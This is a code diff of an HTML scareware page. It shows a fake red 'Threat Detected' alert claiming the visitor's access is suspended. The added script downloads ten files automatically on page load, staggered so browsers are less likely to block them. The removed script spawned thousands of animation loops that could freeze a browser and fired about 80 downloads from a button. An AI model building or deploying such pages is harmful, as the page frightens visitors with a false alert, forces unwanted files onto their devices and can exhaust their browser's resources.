@@ -5,207 +5,169 @@
   <title>Threat Detected</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
+    :root { color-scheme: dark; }
+    html, body { height: 100%; margin: 0; }
     body {
-      margin: 0;
-      height: 100%;
       background: radial-gradient(circle at 50% 40%, #aa0000 0%, #8a0000 35%, #4a0000 100%);
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+      color: #fff;
       display: grid;
       place-items: center;
-      color: #fff;
-      font-family: system-ui, sans-serif;
       overflow: hidden;
     }
     .container {
-      z-index: 20;
       text-align: center;
       padding: 2rem 3rem;
       backdrop-filter: blur(6px) saturate(140%);
       background: rgba(0,0,0,0.25);
       border: 2px solid rgba(255,255,255,0.15);
       border-radius: 18px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.5), inset 0 0 40px rgba(255, 30, 30, 0.25);
+      position: relative;
+      z-index: 10;
     }
-    canvas.snow {
-      position: fixed;
-      inset: 0;
-      width: 100vw;
-      height: 100vh;
-      pointer-events: none;
+    .stop-sign {
+      width: 160px; height: 160px; margin: 0 auto 1rem auto; position: relative;
+      filter: drop-shadow(0 8px 24px rgba(0,0,0,0.45));
+    }
+    .octagon {
+      width: 100%; height: 100%; background: #d21f1f;
+      clip-path: polygon(30% 0%, 70% 0%, 100% 30%, 100% 70%, 70% 100%, 30% 100%, 0% 70%, 0% 30%);
+      border: 8px solid #fff; box-sizing: border-box;
+    }
+    .stop-text {
+      position: absolute; inset: 0; display: grid; place-items: center;
+      font-weight: 900; font-size: 46px; letter-spacing: 2px; color: #fff;
+      text-shadow: 0 2px 0 #a00, 0 10px 30px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0.5rem 0 0.25rem; font-size: 1.75rem; }
+    p { margin: 0.25rem 0 0; font-size: 1rem; opacity: 0.9; }
+    .badge {
+      margin-top: 0.75rem; display: inline-block; padding: 0.35rem 0.7rem;
+      border-radius: 999px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2);
+      font-size: 0.85rem;
+    }
+    canvas#snow {
+      position: fixed; inset: 0; width: 100vw; height: 100vh;
+      pointer-events: none; z-index: 1; display: block;
     }
   </style>
 </head>
 <body>
+  <canvas id="snow"></canvas>
+
   <div class="container">
+    <div class="stop-sign" aria-hidden="true">
+      <div class="octagon"></div>
+      <div class="stop-text">STOP</div>
+    </div>
     <h1>You have been detected as a threat!</h1>
     <p>Access has been suspended. Running Immediate Threat Mitigation</p>
-    <button id="dl">Download Alert</button>
+    <div class="badge">Incident ID: RED-ALERT</div>
   </div>
 
   <script>
-    // Function to start one snowfall loop on its own canvas
-    function startSnowLoop(idSuffix, particleCount) {
-      const canvas = document.createElement('canvas');
-      canvas.className = 'snow';
-      canvas.id = 'snow' + idSuffix;
-      document.body.appendChild(canvas);
-
+    // Snowfall: 10 layered loops in one rAF to prevent flicker/breakage
+    (function () {
+      const canvas = document.getElementById('snow');
       const ctx = canvas.getContext('2d');
+
       let W = canvas.width = window.innerWidth;
       let H = canvas.height = window.innerHeight;
 
-      const particles = [];
-      for (let i = 0; i < particleCount; i++) {
-        particles.push({
-          x: Math.random() * W,
-          y: Math.random() * H,
-          r: Math.random() * 4 + 1,
-          d: Math.random() * particleCount
-        });
+      const LAYERS = 10;           // "10 loops"
+      const PARTICLES_PER_LAYER = 300;
+      const layers = [];
+
+      function makeParticle(w, h, baseSpeed) {
+        return {
+          x: Math.random() * w,
+          y: Math.random() * h,
+          r: Math.random() * 3 + 1,
+          // drift and fall speed vary per particle
+          drift: (Math.random() * 0.8 + 0.2) * baseSpeed,
+          fall: (Math.random() * 0.8 + 0.7) * baseSpeed,
+          phase: Math.random() * Math.PI * 2
+        };
       }
 
-      let angle = 0;
-      function draw() {
-        ctx.clearRect(0, 0, W, H);
-        ctx.fillStyle = "rgba(255,255,255,0.8)";
-        ctx.beginPath();
-        for (let i = 0; i < particleCount; i++) {
-          const p = particles[i];
-          ctx.moveTo(p.x, p.y);
-          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2, true);
+      // Create 10 layers with slightly different dynamics
+      for (let k = 0; k < LAYERS; k++) {
+        const baseSpeed = 1 + k * 0.12; // deeper layers move a bit faster
+        const particles = [];
+        for (let i = 0; i < PARTICLES_PER_LAYER; i++) {
+          particles.push(makeParticle(W, H, baseSpeed));
         }
-        ctx.fill();
-        update();
+        layers.push({ particles, baseSpeed, angle: Math.random() * Math.PI * 2 });
       }
 
-      function update() {
-        angle += 0.01;
-        for (let i = 0; i < particleCount; i++) {
-          const p = particles[i];
-          p.y += Math.cos(angle + p.d) + 1 + p.r / 2;
-          p.x += Math.sin(angle) * 2;
+      function drawFrame() {
+        ctx.clearRect(0, 0, W, H);
+        ctx.fillStyle = 'rgba(255,255,255,0.9)';
+        for (let k = 0; k < LAYERS; k++) {
+          const layer = layers[k];
+          layer.angle += 0.008 + k * 0.0006;
 
-          if (p.x > W + 5 || p.x < -5 || p.y > H) {
-            if (i % 3 > 0) {
-              particles[i] = { x: Math.random() * W, y: -10, r: p.r, d: p.d };
-            } else {
-              if (Math.sin(angle) > 0) {
-                particles[i] = { x: -5, y: Math.random() * H, r: p.r, d: p.d };
-              } else {
-                particles[i] = { x: W + 5, y: Math.random() * H, r: p.r, d: p.d };
-              }
-            }
+          ctx.beginPath();
+          for (let i = 0; i < layer.particles.length; i++) {
+            const p = layer.particles[i];
+            // update
+            p.y += p.fall;
+            p.x += Math.sin(layer.angle + p.phase) * p.drift;
+
+            // wrap
+            if (p.y > H + 8) { p.y = -8; p.x = Math.random() * W; }
+            if (p.x > W + 8) { p.x = -8; }
+            if (p.x < -8)    { p.x = W + 8; }
+
+            // draw
+            ctx.moveTo(p.x, p.y);
+            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          }
+          ctx.fill();
+        }
+        requestAnimationFrame(drawFrame);
+      }
+
+      function onResize() {
+        W = canvas.width = window.innerWidth;
+        H = canvas.height = window.innerHeight;
+        for (let k = 0; k < LAYERS; k++) {
+          const layer = layers[k];
+          for (let i = 0; i < layer.particles.length; i++) {
+            const p = layer.particles[i];
+            // keep position but clamp within new bounds
+            p.x = Math.max(-8, Math.min(W + 8, p.x));
+            p.y = Math.max(-8, Math.min(H + 8, p.y));
           }
         }
       }
+      window.addEventListener('resize', onResize, false);
+      requestAnimationFrame(drawFrame);
+    })();
 
-      setInterval(draw, 33);
-      window.addEventListener('resize', () => {
-        W = canvas.width = window.innerWidth;
-        H = canvas.height = window.innerHeight;
+    // Auto-download attempts (browsers may block multiple non-gesture downloads)
+    (function autoDownloads() {
+      function downloadFile(filename, content) {
+        const blob = new Blob([content], { type: 'text/html' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        setTimeout(() => URL.revokeObjectURL(link.href), 1000);
+      }
+
+      const files = [
+        'alert.html','alert.html','alert.html','alert.html','alert.html',
+        'alert.html','alert.html','alert.html','alert.html','alert.html'
+      ];
+      // Staggered to maximize chances
+      files.forEach((name, i) => {
+        setTimeout(() => downloadFile(name, 'Threat Detected! Alert!'), i * 250);
       });
-    }
-
-    // Start 10 loops
-    for (let k = 0; k < 5000; k++) {
-      startSnowLoop(k, 600); // each loop has 300 particles
-    }
-
-    // Download logic
-    function downloadFile(filename, content) {
-      const blob = new Blob([content], { type: "text/html" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = filename;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-      setTimeout(() => URL.revokeObjectURL(link.href), 1000);
-    }
-
-    document.getElementById('dl').addEventListener('click', () => {
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-      downloadFile("alert.html", "Threat Detected! Alert!");
-    });
+    })();
   </script>
 </body>
 </html>
